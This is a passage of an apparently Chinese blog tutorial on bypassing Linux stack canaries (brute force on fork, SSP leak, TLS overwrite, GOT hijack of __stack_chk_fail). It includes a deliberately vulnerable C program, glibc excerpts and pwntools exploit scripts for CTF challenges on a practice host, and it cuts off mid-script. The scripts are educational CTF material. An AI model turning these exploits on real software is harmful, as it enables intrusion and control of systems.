<span class=\"literal\">NULL</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">vul</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">char</span> <span class=\"built_in\">buffer</span>[<span class=\"number\">100</span>];</span><br><span class=\"line\">    <span class=\"built_in\">read</span>(STDIN_FILENO, <span class=\"built_in\">buffer</span>, <span class=\"number\">120</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span> </span>&#123;</span><br><span class=\"line\">    init();</span><br><span class=\"line\">\t<span class=\"keyword\">pid_t</span> pid;</span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(<span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">\t\tpid = fork();</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(pid &lt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">puts</span>(<span class=\"string\">\"fork error\"</span>);</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(pid == <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">puts</span>(<span class=\"string\">\"welcome\"</span>);</span><br><span class=\"line\">\t\t\tvul();</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">puts</span>(<span class=\"string\">\"recv sucess\"</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">\t\t\twait(<span class=\"number\">0</span>);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">p = process(<span class=\"string\">'./bin'</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./bin\"</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">'welcome\\n'</span>)</span><br><span class=\"line\">canary = <span class=\"string\">'\\x00'</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">3</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0x100</span>):</span><br><span class=\"line\">        p.send(<span class=\"string\">'a'</span>*<span class=\"number\">100</span> + canary + chr(i))</span><br><span class=\"line\">        a = p.recvuntil(<span class=\"string\">'welcome\\n'</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"string\">'recv'</span> <span class=\"keyword\">in</span> a:</span><br><span class=\"line\">            canary += chr(i)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.sendline(<span class=\"string\">'a'</span>*<span class=\"number\">100</span> + canary + <span class=\"string\">'a'</span>*<span class=\"number\">12</span> + p32(<span class=\"number\">0x80485FB</span>))</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"cat flag\"</span>)</span><br><span class=\"line\">flag = p.recv()</span><br><span class=\"line\">p.close()</span><br><span class=\"line\">log.success(<span class=\"string\">'flag is:'</span> + flag)</span><br></pre></td></tr></table></figure>\n<h2 id=\"3-3-SSP-Stack-Smashing-Protect-Leak\"><a href=\"#3-3-SSP-Stack-Smashing-Protect-Leak\" class=\"headerlink\" title=\"3.3 SSP(Stack Smashing Protect) Leak\"></a>3.3 SSP(Stack Smashing Protect) Leak</h2><p><strong>SSP leak canary</strong></p>\n<p>canary_stack_chk_fail<code>stack smashing detected</code></p>\n<p></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// debug/stack_chk_fail.c</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"keyword\">char</span> **__libc_argv attribute_hidden;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span></span><br><span class=\"line\">__attribute__ ((noreturn))</span><br><span class=\"line\">__stack_chk_fail (<span class=\"keyword\">void</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __fortify_fail (<span class=\"string\">\"stack smashing detected\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p> <code>__fortify_fail()</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// debug/fortify_fail.c</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"keyword\">char</span> **__libc_argv attribute_hidden;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span></span><br><span class=\"line\">__attribute__ ((noreturn)) internal_function</span><br><span class=\"line\">__fortify_fail (<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *msg)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"comment\">/* The loop is added only to keep gcc happy.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">while</span> (<span class=\"number\">1</span>)</span><br><span class=\"line\">    __libc_message (<span class=\"number\">2</span>, <span class=\"string\">\"*** %s ***: %s terminated\\n\"</span>,</span><br><span class=\"line\">                    msg, __libc_argv[<span class=\"number\">0</span>] ?: <span class=\"string\">\"&lt;unknown&gt;\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">libc_hidden_def (__fortify_fail)</span><br></pre></td></tr></table></figure>\n<p><code>__fortify_fail()</code>  <code>__libc_message()</code>  <code>argv[0]</code></p>\n<p>%smsgmsg!=NULL__libc_argv[0]<unknown>argv[0]argv[0]flagflag</unknown></p>\n<p><strong>libc2.26</strong>2.262.25</p>\n<p> libc-2.25  <code>__stack_chk_fail</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"keyword\">char</span> **__libc_argv attribute_hidden;</span><br><span class=\"line\"><span class=\"keyword\">void</span></span><br><span class=\"line\">__attribute__ ((noreturn))</span><br><span class=\"line\">__stack_chk_fail (<span class=\"keyword\">void</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __fortify_fail_abort (<span class=\"literal\">false</span>, <span class=\"string\">\"stack smashing detected\"</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">strong_alias (__stack_chk_fail, __stack_chk_fail_local)</span><br></pre></td></tr></table></figure>\n<p> <code>__fortify_fail_abort()</code> <a href=\"https://sourceware.org/git/?p=glibc.git;a=commit;h=ed421fca42fd9b4cab7c66e77894b8dd7ca57ed0\" target=\"_blank\" rel=\"noopener\">BZ #12189</a> </p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">extern</span> <span class=\"keyword\">char</span> **__libc_argv attribute_hidden;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span></span><br><span class=\"line\">__attribute__ ((noreturn))</span><br><span class=\"line\">__fortify_fail_abort (<span class=\"built_in\">_Bool</span> need_backtrace, <span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *msg)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"comment\">/* The loop is added only to keep gcc happy.  Don't pass down</span></span><br><span class=\"line\"><span class=\"comment\">     __libc_argv[0] if we aren't doing backtrace since __libc_argv[0]</span></span><br><span class=\"line\"><span class=\"comment\">     may point to the corrupted stack.  */</span></span><br><span class=\"line\">  <span class=\"keyword\">while</span> (<span class=\"number\">1</span>)</span><br><span class=\"line\">    __libc_message (need_backtrace ? (do_abort | do_backtrace) : do_abort,</span><br><span class=\"line\">                    <span class=\"string\">\"*** %s ***: %s terminated\\n\"</span>,</span><br><span class=\"line\">                    msg,</span><br><span class=\"line\">                    (need_backtrace &amp;&amp; __libc_argv[<span class=\"number\">0</span>] != <span class=\"literal\">NULL</span></span><br><span class=\"line\">                     ? __libc_argv[<span class=\"number\">0</span>] : <span class=\"string\">\"&lt;unknown&gt;\"</span>));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">void</span></span><br><span class=\"line\">__attribute__ ((noreturn))</span><br><span class=\"line\">__fortify_fail (<span class=\"keyword\">const</span> <span class=\"keyword\">char</span> *msg)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  __fortify_fail_abort (<span class=\"literal\">true</span>, msg);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">libc_hidden_def (__fortify_fail)</span><br><span class=\"line\">libc_hidden_def (__fortify_fail_abort)</span><br></pre></td></tr></table></figure>\n<p> <code>__fortify_fail_abort()</code>  <code>false</code>  <code>&lt;unknown&gt;</code>  <code>argv[0]</code> </p>\n<h3 id=\"wdb2018-guess\"><a href=\"#wdb2018-guess\" class=\"headerlink\" title=\"wdb2018_guess\"></a>wdb2018_guess</h3><p><img src=\"/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210221200044056.png\" alt=\"image-20210221200044056\"></p>\n<p>flag.txtflagfork</p>\n<p>fork</p>\n<blockquote>\n<p>Unix/Linux<code>fork()</code><strong><code>fork()</code></strong></p>\n<p><code>0</code>IDforkID<code>getppid()</code>ID</p>\n</blockquote>\n<p><strong>flagflag</strong></p>\n<p><strong><code>__environ</code></strong></p>\n<blockquote>\n<p> Linux glibc  environ(environment pointer)  environ <strong> environ </strong></p>\n<p>1libclibc+_environ=_environ ASLRlibc  </p>\n<p>2_environ_environ</p>\n</blockquote>\n<ol>\n<li>argv[0]got</li>\n<li>environ</li>\n<li>flag</li>\n</ol>\n<p>getargv[0]offset</p>\n<p>296</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p &amp; __libc_argv[0]</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210221223741272.png\" alt=\"image-20210221223741272\"></p>\n<p>environflagoffset,360</p>\n<p><img src=\"/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210221224236237.png\" alt=\"image-20210221224236237\"></p>\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"keyword\">from</span> LibcSearcher <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">27910</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./GUESS\"</span>)</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">'puts'</span>]</span><br><span class=\"line\">payload = <span class=\"string\">'A'</span>*<span class=\"number\">296</span> + p64(puts_got)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">ru(<span class=\"string\">\"*** stack smashing detected ***: \"</span>)</span><br><span class=\"line\">puts = uu64(r(<span class=\"number\">6</span>))</span><br><span class=\"line\">leak(<span class=\"string\">\"puts\"</span>,puts)</span><br><span class=\"line\">libc = LibcSearcher(<span class=\"string\">'puts'</span>,puts)</span><br><span class=\"line\">libc_base = puts - libc.dump(<span class=\"string\">'puts'</span>)</span><br><span class=\"line\">environ = libc_base + libc.dump(<span class=\"string\">'_environ'</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*<span class=\"number\">296</span> + p64(environ)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">ru(<span class=\"string\">\"*** stack smashing detected ***: \"</span>)</span><br><span class=\"line\">environ = uu64(r(<span class=\"number\">6</span>))</span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*<span class=\"number\">296</span> + p64(environ<span class=\"number\">-360</span>)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"3-4--TLS--Canary-\"><a href=\"#3-4--TLS--Canary-\" class=\"headerlink\" title=\"3.4  TLS  Canary \"></a>3.4  TLS  Canary </h2><p> Canary  TLS  Canary  TLS  Canary </p>\n<blockquote>\n<p>Thread Local Storage<br>TLS</p>\n<p>glibcTLSpthread_createTLS<br>glibcTLSx86-64TLS<br>TLSstack register<br>TLSpthread_create<br>leak canaryTLStcbhead_t.stack_guardbypass canary</p>\n</blockquote>\n<h3 id=\"CTF2018-babystack\"><a href=\"#CTF2018-babystack\" class=\"headerlink\" title=\"*CTF2018 babystack\"></a>*CTF2018 babystack</h3><p><img src=\"/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210222142851478.png\" alt=\"image-20210222142851478\"></p>\n<p>size</p>\n<p></p>\n<p><img src=\"/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210222142625810.png\" alt=\"image-20210222142625810\"></p>\n<p></p>\n<ol>\n<li>libc</li>\n<li>bss</li>\n<li>ROP</li>\n</ol>\n<p>canary</p>\n<p><img src=\"/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210222150721776.png\" alt=\"image-20210222150721776\"></p>\n<p>exp</p>\n<blockquote>\n<p>/bin/shonegadget</p>\n</blockquote>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\"><span class=\"comment\">#context.arch = elf.arch</span></span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">26593</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process('./bs')</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./bs\"</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">'./libc-2.271.so'</span>)</span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">pop_rdi = <span class=\"number\">0x400c03</span></span><br><span class=\"line\">pop_rsi_r15 = <span class=\"number\">0x400c01</span></span><br><span class=\"line\">read_plt = elf.sym[<span class=\"string\">'read'</span>]</span><br><span class=\"line\">puts_got = elf.got[<span class=\"string\">'puts'</span>]</span><br><span class=\"line\">put_plt = elf.sym[<span class=\"string\">'puts'</span>]</span><br><span class=\"line\">buf = <span class=\"number\">0x602f00</span></span><br><span class=\"line\">leave_ret = <span class=\"number\">0x400955</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload =<span class=\"string\">b'A'</span>*<span class=\"number\">0x1010</span> + p64(buf)+ p64(pop_rdi) + p64(puts_got) + p64(put_plt) + p64(pop_rdi) + p64(<span class=\"number\">0</span>) + p64(pop_rsi_r15) + p64(buf+<span class=\"number\">0x8</span>) + p64(<span class=\"number\">0</span>) + p64(read_plt) + p64(leave_ret)</span><br><span class=\"line\"></span><br><span class=\"line\">ru(<span class=\"string\">\"How many bytes do you want to send?\\n\"</span>)</span><br><span class=\"line\">sl(str(<span class=\"number\">0x2000</span>))</span><br><span class=\"line\">payload = payload.ljust(<span class=\"number\">0x2000</span>,<span class=\"string\">'A'</span>)</span><br><span class=\"line\">s(payload)</span><br><span class=\"line\">puts = uu64(ru(<span class=\"string\">'\\x7f'</span>,<span class=\"literal\">False</span>)[<span class=\"number\">-6</span>:])</span><br><span class=\"line\">leak(<span class=\"string\">\"puts\"</span>,puts)</span><br><span class=\"line\">libc_base = puts - libc.sym[<span class=\"string\">\"puts\"</span>]</span><br><span class=\"line\">leak(<span class=\"string\">\"libc_base\"</span>,libc_base)</span><br><span class=\"line\"><span class=\"comment\"># sys = libc_base + libc.sym[\"system\"]</span></span><br><span class=\"line\"><span class=\"comment\"># bin_sh = libc_base + (libc.search(\"/bin/sh\")).next()</span></span><br><span class=\"line\"><span class=\"comment\"># libc = LibcSearcher('puts',puts)</span></span><br><span class=\"line\"><span class=\"comment\"># libc_base = puts - libc.dump('puts')</span></span><br><span class=\"line\"><span class=\"comment\"># leak(\"libc_base\",libc_base)</span></span><br><span class=\"line\"><span class=\"comment\"># sys = libc_base + libc.dump('system')</span></span><br><span class=\"line\"><span class=\"comment\"># bin_sh = libc_base + libc.dump('str_bin_sh')</span></span><br><span class=\"line\"><span class=\"comment\">#payload = p64(pop_rdi) + p64(bin_sh) + p64(sys)</span></span><br><span class=\"line\">payload = p64(libc_base+<span class=\"number\">0x4f322</span>)</span><br><span class=\"line\">sl(payload)</span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n<h2 id=\"3-5--stack-chk-fail\"><a href=\"#3-5--stack-chk-fail\" class=\"headerlink\" title=\"3.5 __stack_chk_fail\"></a>3.5 __stack_chk_fail</h2><p>__stack_chk_fail@got<br>canary</p>\n<h3 id=\"BJDCTF-2nd-r2t4\"><a href=\"#BJDCTF-2nd-r2t4\" class=\"headerlink\" title=\"[BJDCTF 2nd]r2t4\"></a>[BJDCTF 2nd]r2t4</h3><p><img src=\"/2021/02/19/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/image-20210222203954917.png\" alt=\"image-20210222203954917\"></p>\n<p></p>\n<ol>\n<li>gotbackdoor</li>\n</ol>\n<blockquote>\n<p>pwntoolsfmt6432</p>\n<p></p>\n</blockquote>\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding:utf-8 -*-</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\">#from LibcSearcher import *</span></span><br><span class=\"line\"><span class=\"comment\">#context.os='linux'</span></span><br><span class=\"line\">context.log_level=<span class=\"string\">'debug'</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./r2t4\"</span>)</span><br><span class=\"line\">context.arch = elf.arch</span><br><span class=\"line\"><span class=\"comment\">#context.terminal = ['terminator', '-x', 'sh', '-c']</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(str(data))</span><br><span class=\"line\">sa      = <span class=\"keyword\">lambda</span> delim,data         :p.sendafter(str(delim), str(data))</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(str(data))</span><br><span class=\"line\">sla     = <span class=\"keyword\">lambda</span> delim,data         :p.sendlineafter(str(delim), str(data))</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> delims, drop=<span class=\"literal\">True</span>  :p.recvuntil(delims, drop)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">'\\0'</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">'&#123;&#125; = &#123;:#x&#125;'</span>.format(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\">p = remote(<span class=\"string\">\"node3.buuoj.cn\"</span>,<span class=\"number\">25608</span>)</span><br><span class=\"line\"><span class=\"comment\">#p = process('./r2t4')</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">__stack_chk_fail = elf.got[<span class=\"string\">'__stack_chk_fail'</span>]</span><br><span class=\"line\">backdoor = elf.sym[<span class=\"string\">'backdoor'</span>]</span><br><span class=\"line\">print(hex(backdoor))</span><br><span class=\"line\"><span class=\"comment\">#payload = 